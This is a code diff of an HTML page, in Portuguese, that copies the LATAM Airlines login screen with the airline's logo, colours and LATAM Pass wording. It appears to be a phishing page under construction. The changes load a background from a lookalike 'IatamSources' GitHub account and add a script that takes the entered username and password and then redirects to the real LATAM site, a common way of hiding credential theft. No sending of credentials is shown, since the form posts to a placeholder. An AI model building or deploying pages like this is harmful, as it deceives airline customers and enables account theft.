@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Faça seu Login | LATAM AIRLINES</title>
-    <!-- Define o ícone da página -->
     <link rel="icon" href="https://th.bing.com/th/id/OIP.pawmiYLYxeNk4mrlvyIlqAHaL4?
 
 rs=1&pid=ImgDetMain">
@@ -13,67 +12,86 @@ rs=1&pid=ImgDetMain">
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f0f0f0; /* Cor de fundo da página */
+            background: url
+
+('https://github.com/IatamSources/src/blob/main/background.png?raw=true') no-repeat 
+
+center center fixed;
+            background-size: cover;
         }
         .container {
             width: 50%;
-            margin: 100px auto; /* Centraliza o container na página */
-            background-color: rgba(255, 255, 255, 0.8); /* Fundo branco semi-transparente 
-
-*/
+            margin: 100px auto;
+            background-color: rgba(255, 255, 255, 0.8);
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Sombra suave ao redor do 
-
-container */
-	    border-top: 5px solid rgb(27, 0, 136);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-top: 5px solid rgb(27, 0, 136);
         }
         form {
-            text-align: left; /* Alinha o texto à esquerda */
+            text-align: left;
         }
         form input {
             margin-bottom: 10px;
-            width: calc(100% - 20px); /* Deixa um espaço de 10px em cada lado */
+            width: calc(100% - 20px);
             padding: 10px;
             box-sizing: border-box;
             border: 1px solid #ccc;
             border-radius: 5px;
-            display: block; /* Exibe o input como bloco */
+            display: block;
             margin-left: auto;
-            margin-right: auto; /* Centraliza horizontalmente */
+            margin-right: auto;
         }
         form button {
-            width: 150px; /* Define a largura do botão */
+            width: 150px;
             padding: 10px;
-            background-color: rgb(232, 17, 75); /* Cor de fundo do botão */
+            background-color: rgb(232, 17, 75);
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            margin: 20px auto 0; /* Centraliza o botão horizontalmente e adiciona margem 
-
-superior */
-            display: block; /* Para que a margem funcione */
+            margin: 20px auto 0;
+            display: block;
         }
         .logo {
-            width: 100px; /* Define a largura da imagem logo */
+            width: 100px;
             margin-bottom: 20px;
+            display: block;
         }
         .texto-superior {
-            color: rgb(27, 0, 136); /* Cor do texto superior */
+            color: rgb(27, 0, 136);
             margin-bottom: 10px;
         }
         .texto-inferior {
-            color: rgb(48, 48, 48); /* Cor do texto inferior */
+            color: rgb(48, 48, 48);
             margin-top: 10px;
         }
+        .error-message {
+            color: red;
+            margin-bottom: 10px;
+            display: none;
+        }
     </style>
+    <script>
+        function validateForm(event) {
+            event.preventDefault();
+            var username = document.forms["loginForm"]["alias"].value;
+            var password = document.forms["loginForm"]["password"].value;
+            var errorMessage = document.getElementById("error-message");
+
+            if (username === "" || password === "") {
+                errorMessage.style.display = "block";
+                errorMessage.textContent = "Por favor, preencha todos os campos.";
+            } else {
+                errorMessage.style.display = "none";
+                window.location.href = 'https://www.latamairlines.com';
+            }
+        }
+    </script>
 </head>
 <body>
     <div class="container">
-        <!-- Formulário de login -->
-        <form action="foo" method="post">
-            <!-- Imagem do logo LATAM -->
+        <form name="loginForm" action="foo" method="post" onsubmit="validateForm(event)">
             <img src="https://th.bing.com/th/id/R.8c29d58fe7dc2c144922bc2c2c07d008?
 
 rik=9EVDOKvltMk8Kg&riu=http%3a%2f%2flogos-download.com%2fwp-content%2fuploads
@@ -81,19 +99,15 @@ rik=9EVDOKvltMk8Kg&riu=http%3a%2f%2flogos-download.com%2fwp-content%2fuploads
 %2f2016%2f12%2fLATAM_Airlines_logo_wordmark.png&ehk=KoMMi4amEshpJz3dL4OUfFcHwZ
 
 %2b32OLiAE591EJWXs4%3d&risl=&pid=ImgRaw&r=0" alt="Logo da LATAM Airlines" class="logo">
-            <!-- Texto superior -->
             <p class="texto-superior">Insira seu usuário:</p>
-            <!-- Texto inferior -->
             <p class="texto-inferior">Dê preferência ao seu número LATAM Pass ao inserir 
 
 seus dados:</p>
-            <!-- Campo de entrada para o usuário -->
+            <div id="error-message" class="error-message"></div>
             <input type="text" name="alias" placeholder="Email, CPF ou Número de 
 
 cliente">
-            <!-- Campo de entrada para a senha -->
             <input type="password" name="password" placeholder="Senha">
-            <!-- Botão para enviar o formulário -->
             <button type="submit">Continuar</button>
         </form>
     </div>
